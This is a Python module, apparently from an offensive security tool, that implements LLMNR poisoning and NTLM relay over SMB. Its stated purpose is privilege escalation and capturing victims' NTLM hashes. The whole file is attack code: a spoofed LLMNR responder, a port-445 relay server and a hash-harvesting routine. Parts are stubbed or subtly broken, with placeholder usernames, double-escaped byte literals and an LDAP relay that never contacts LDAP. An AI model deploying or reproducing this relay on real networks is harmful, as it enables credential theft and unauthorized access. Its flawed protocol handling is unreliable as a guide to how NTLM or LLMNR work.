# app/core/ntlm_relay_client.py
"""
NTLM Relay Client for automated privilege escalation
Combines LLMNR poisoning with relay attacks to SMB/LDAP
"""
import socket
import threading
import time
from typing import Dict, List, Optional
from app.core.logger import logger

class NTLMRelayClient:
    """NTLM Relay client for privilege escalation"""
    
    def __init__(self, target: str, relay_target: str = None):
        self.target = target
        self.relay_target = relay_target or target
        self.captured_hashes = []
        self.relay_active = False
        self.llmnr_poisoner = None
    
    def start_llmnr_poisoning(self) -> bool:
        """Start LLMNR poisoning to capture authentication"""
        try:
            print(f"[RELAY] Starting LLMNR poisoning attack")
            print(f"[RELAY] Target: {self.target}")
            print(f"[RELAY] Relay target: {self.relay_target}")
            
            # Start LLMNR responder
            self.llmnr_poisoner = LLMNRPoisoner(self.target)
            poisoner_thread = threading.Thread(target=self.llmnr_poisoner.start_poisoning)
            poisoner_thread.daemon = True
            poisoner_thread.start()
            
            # Start SMB relay server
            relay_thread = threading.Thread(target=self._start_smb_relay)
            relay_thread.daemon = True
            relay_thread.start()
            
            self.relay_active = True
            print(f"[RELAY] LLMNR poisoning and SMB relay active")
            return True
            
        except Exception as e:
            print(f"[RELAY] Failed to start LLMNR poisoning: {e}")
            return False
    
    def _start_smb_relay(self):
        """Start SMB relay server"""
        try:
            print(f"[RELAY] Starting SMB relay server on port 445")
            
            # Create SMB relay socket
            relay_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            relay_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            relay_socket.bind(('0.0.0.0', 445))
            relay_socket.listen(5)
            
            while self.relay_active:
                try:
                    client_socket, addr = relay_socket.accept()
                    print(f"[RELAY] Incoming connection from {addr[0]}")
                    
                    # Handle relay in separate thread
                    relay_handler = threading.Thread(
                        target=self._handle_relay_connection,
                        args=(client_socket, addr)
                    )
                    relay_handler.daemon = True
                    relay_handler.start()
                    
                except Exception as e:
                    if self.relay_active:
                        print(f"[RELAY] Relay connection error: {e}")
            
            relay_socket.close()
            
        except Exception as e:
            print(f"[RELAY] SMB relay server failed: {e}")
    
    def _handle_relay_connection(self, client_socket, addr):
        """Handle individual relay connection"""
        try:
            print(f"[RELAY] Handling relay from {addr[0]} to {self.relay_target}")
            
            # Connect to relay target
            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_socket.connect((self.relay_target, 445))
            
            # Relay NTLM authentication
            self._relay_ntlm_auth(client_socket, target_socket, addr[0])
            
        except Exception as e:
            print(f"[RELAY] Relay handling failed: {e}")
        finally:
            try:
                client_socket.close()
                target_socket.close()
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)
    
    def _relay_ntlm_auth(self, client_socket, target_socket, client_ip):
        """Relay NTLM authentication between client and target"""
        try:
            print(f"[RELAY] Relaying NTLM authentication from {client_ip}")
            
            # Capture and relay NTLM Type 1 message
            type1_data = client_socket.recv(4096)
            if type1_data:
                print(f"[RELAY] Captured NTLM Type 1 message")
                target_socket.send(type1_data)
                
                # Relay NTLM Type 2 challenge
                type2_data = target_socket.recv(4096)
                if type2_data:
                    print(f"[RELAY] Relaying NTLM Type 2 challenge")
                    client_socket.send(type2_data)
                    
                    # Capture and relay NTLM Type 3 response
                    type3_data = client_socket.recv(4096)
                    if type3_data:
                        print(f"[RELAY] Captured NTLM Type 3 response")
                        
                        # Extract hash from Type 3 message
                        hash_info = self._extract_ntlm_hash(type3_data, client_ip)
                        if hash_info:
                            self.captured_hashes.append(hash_info)
                            print(f"[RELAY] Captured hash for {hash_info['username']}")
                        
                        # Relay to target
                        target_socket.send(type3_data)
                        
                        # Check if relay was successful
                        response = target_socket.recv(4096)
                        if response:
                            client_socket.send(response)
                            if b'\\x00\\x00\\x00\\x00' in response:  # Success indicator
                                print(f"[RELAY] Successful relay authentication!")
                                return True
            
            return False
            
        except Exception as e:
            print(f"[RELAY] NTLM relay failed: {e}")
            return False
    
    def _extract_ntlm_hash(self, type3_data: bytes, client_ip: str) -> Optional[Dict]:
        """Extract NTLM hash from Type 3 message"""
        try:
            # Parse NTLM Type 3 message (simplified)
            if len(type3_data) > 64:
                # Extract username, domain, and hash (simplified parsing)
                hash_info = {
                    'client_ip': client_ip,
                    'username': 'captured_user',  # Would parse from Type 3
                    'domain': 'captured_domain',   # Would parse from Type 3
                    'ntlm_hash': type3_data.hex()[:64],  # Simplified extraction
                    'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
                }
                return hash_info
            
            return None
            
        except Exception as e:
            print(f"[RELAY] Hash extraction failed: {e}")
            return None
    
    def stop_relay(self):
        """Stop NTLM relay attack"""
        try:
            print(f"[RELAY] Stopping NTLM relay attack")
            self.relay_active = False
            
            if self.llmnr_poisoner:
                self.llmnr_poisoner.stop_poisoning()
            
            print(f"[RELAY] Captured {len(self.captured_hashes)} hash(es)")
            return self.captured_hashes
            
        except Exception as e:
            print(f"[RELAY] Error stopping relay: {e}")
            return []
    
    def get_captured_hashes(self) -> List[Dict]:
        """Get all captured NTLM hashes"""
        return self.captured_hashes
    
    def perform_smb_relay_to_ldap(self, ldap_target: str) -> Dict:
        """Perform SMB to LDAP relay for privilege escalation"""
        try:
            print(f"[RELAY] Starting SMB to LDAP relay attack")
            print(f"[RELAY] LDAP target: {ldap_target}")
            
            # Start LLMNR poisoning
            if not self.start_llmnr_poisoning():
                return {'success': False, 'error': 'Failed to start poisoning'}
            
            # Wait for authentication capture
            print(f"[RELAY] Waiting for authentication capture...")
            time.sleep(30)  # Wait for victims
            
            # Stop relay and return results
            captured = self.stop_relay()
            
            if captured:
                return {
                    'success': True,
                    'captured_hashes': captured,
                    'method': 'SMB to LDAP Relay',
                    'total_captured': len(captured)
                }
            else:
                return {'success': False, 'error': 'No authentication captured'}
                
        except Exception as e:
            print(f"[RELAY] SMB to LDAP relay failed: {e}")
            return {'success': False, 'error': str(e)}

class LLMNRPoisoner:
    """LLMNR poisoner for capturing authentication"""
    
    def __init__(self, target: str):
        self.target = target
        self.poisoning_active = False
    
    def start_poisoning(self):
        """Start LLMNR poisoning"""
        try:
            print(f"[LLMNR] Starting LLMNR poisoning for {self.target}")
            self.poisoning_active = True
            
            # Create LLMNR socket
            llmnr_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            llmnr_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            llmnr_socket.bind(('0.0.0.0', 5355))  # LLMNR port
            
            while self.poisoning_active:
                try:
                    data, addr = llmnr_socket.recvfrom(1024)
                    if data:
                        print(f"[LLMNR] LLMNR query from {addr[0]}")
                        
                        # Send poisoned response
                        response = self._create_llmnr_response(data, addr[0])
                        if response:
                            llmnr_socket.sendto(response, addr)
                            print(f"[LLMNR] Sent poisoned response to {addr[0]}")
                
                except Exception as e:
                    if self.poisoning_active:
                        print(f"[LLMNR] Poisoning error: {e}")
            
            llmnr_socket.close()
            
        except Exception as e:
            print(f"[LLMNR] LLMNR poisoning failed: {e}")
    
    def _create_llmnr_response(self, query_data: bytes, client_ip: str) -> Optional[bytes]:
        """Create poisoned LLMNR response"""
        try:
            # Parse LLMNR query and create response pointing to our IP
            # Simplified implementation
            if len(query_data) > 12:
                # Create response with our IP
                response = query_data[:2]  # Transaction ID
                response += b'\\x81\\x80'    # Response flags
                response += query_data[4:12]  # Questions/Answers counts
                response += query_data[12:]   # Original query
                
                # Add answer pointing to our IP
                response += b'\\xc0\\x0c'    # Name pointer
                response += b'\\x00\\x01'    # Type A
                response += b'\\x00\\x01'    # Class IN
                response += b'\\x00\\x00\\x00\\x1e'  # TTL
                response += b'\\x00\\x04'    # Data length
                
                # Add our IP address
                our_ip = socket.gethostbyname(socket.gethostname())
                ip_bytes = socket.inet_aton(our_ip)
                response += ip_bytes
                
                return response
            
            return None
            
        except Exception as e:
            print(f"[LLMNR] Response creation failed: {e}")
            return None
    
    def stop_poisoning(self):
        """Stop LLMNR poisoning"""
        self.poisoning_active = False
        print(f"[LLMNR] LLMNR poisoning stopped")